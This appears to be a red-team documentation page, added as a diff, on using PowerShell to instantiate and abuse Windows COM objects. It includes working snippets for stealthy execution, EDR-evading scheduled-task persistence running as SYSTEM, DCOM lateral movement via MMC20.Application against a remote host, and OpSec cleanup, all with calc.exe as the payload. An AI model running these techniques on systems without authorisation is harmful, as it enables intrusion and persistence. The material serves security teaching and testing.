@@ -1,0 +1,139 @@
+---
+title: Component Object Management (COM)
+description: Using PowerShell to instantiate, interact with, and abuse COM objects for automation, lateral movement, and persistence.
+tags:
+  - COM
+  - PowerShell
+  - WindowsInternals
+---
+
+# Component Object Management (COM)
+
+The Component Object Model (COM) is a Microsoft platform for software componentry. It is heavily used by system administrators for automation and by red teamers for "Living off the Land" (LotL) techniques, as it allows interaction with legitimate OS components without dropping custom executables.
+
+![COM Architecture](/docs/Asset/Pasted%20image%2020260301123605.png)
+
+<Callout type="info" title="Red Team Utility">
+COM objects are frequently abused for persistence (COM Hijacking), execution (Outlook Macros, Excel 4.0), and lateral movement (DCOM). Because they run inside host processes like `svchost.exe` or `excel.exe`, they can bypass application whitelisting (AppLocker).
+</Callout>
+
+---
+
+## Instantiating COM Objects
+
+COM objects can be instantiated in PowerShell using either their Programmatic Identifier (ProgID) or their globally unique identifier (CLSID).
+
+<Tabs>
+  <Tab title="Using ProgID">
+    ProgIDs are human-readable strings mapped to CLSIDs in the registry (`HKCR\ProgID`).
+    ```powershell
+    # Instantiate WScript.Network
+    $obj = New-Object -ComObject "Wscript.Network"
+    
+    # Display object methods and properties
+    $obj | Get-Member
+    $obj.ComputerName
+    $obj.UserName
+    ```
+  </Tab>
+  <Tab title="Using CLSID">
+    CLSIDs are the actual unique identifiers in the registry (`HKCR\CLSID`). Useful when a ProgID is not registered or you want to invoke a specific version.
+    ```powershell
+    $CLSID = New-Object Guid "093FF999-1EA0-4079-9525-9614C3504B74"
+    $type = [type]::GetTypeFromCLSID($CLSID)
+    $obj = [Activator]::CreateInstance($type)
+    
+    $obj | Get-Member
+    ```
+  </Tab>
+</Tabs>
+
+---
+
+## Practical COM Abuse Examples
+
+Below are several examples of using COM objects to interact with the Windows operating system, execute payloads, and establish persistence.
+
+### 1. Windows Shell (`Shell.Application`)
+Used to execute binaries, open folders, or minimize all windows. Useful for stealthy execution.
+
+```powershell
+$shell = New-Object -ComObject Shell.Application
+
+# Minimize all windows (useful for hiding activity)
+$shell.MinimizeAll()
+
+# Execute a binary
+$shell.ShellExecute("calc.exe")
+
+# Open a folder in Explorer
+$shell.Explore("C:\Windows\System32")
+```
+
+### 2. Task Scheduler (`Schedule.Service`)
+Red teams use this COM object to create Scheduled Tasks for persistence without using the `schtasks.exe` binary, which is heavily monitored by EDRs.
+
+<Steps>
+  <Step title="Step 1: Connect to the Task Service">
+    ```powershell
+    $scheduler = New-Object -ComObject Schedule.Service
+    $scheduler.Connect()
+    $folder = $scheduler.GetFolder("\")
+    ```
+  </Step>
+  <Step title="Step 2: Define the Task">
+    ```powershell
+    $definition = $scheduler.NewTask(0)
+    $trigger = $definition.Triggers.Create(1) # 1 = Daily Trigger
+    $trigger.StartBoundary = "2024-01-01T00:00:00"
+    
+    $action = $definition.Actions.Create(0) # 0 = Exec
+    $action.Path = "C:\Windows\System32\calc.exe"
+    $action.Arguments = ""
+    ```
+  </Step>
+  <Step title="Step 3: Register the Task">
+    ```powershell
+    # 6 = Create or Update, 3 = Run as SYSTEM (Requires Admin)
+    $folder.RegisterTaskDefinition("MyTask", $definition, 6, $null, $null, 3)
+    ```
+  </Step>
+</Steps>
+
+### 3. MMC20.Application (Lateral Movement via DCOM)
+The MMC20.Application COM object allows remote execution via DCOM. If an attacker has local admin rights on a remote machine, they can execute commands on it without using PsExec or WMI.
+
+```powershell
+# Instantiate the COM object on a remote machine
+$com = [Type]::GetTypeFromProgID("MMC20.Application", "192.168.1.50")
+
+# Create the object instance
+$obj = [Activator]::CreateInstance($com)
+
+# Execute a command via Document.ActiveView.ExecuteShellCommand
+# Syntax: ExecuteShellCommand(Command, Directory, Parameters, WindowState)
+$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
+```
+
+### 4. Microsoft Excel (`Excel.Application`)
+Often used to execute macros dynamically or bypass script execution restrictions.
+
+```powershell
+$excel = New-Object -ComObject Excel.Application
+$excel.Visible = $true
+$workbook = $excel.Workbooks.Add()
+$worksheet = $workbook.Worksheets.Item(1)
+$worksheet.Cells.Item(1,1) = "Hello from PowerShell"
+$workbook.SaveAs("C:\Temp\test.xlsx")
+```
+
+<Callout type="warning" title="Memory Management (OpSec)">
+When you are done with a COM object, you **must** release it from memory. Failing to do so leaves background processes (like `excel.exe`) running, which is bad for Operational Security.
+```powershell
+# Quit the application
+$excel.Quit()
+
+# Release the COM object
+[System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
+```
+</Callout>
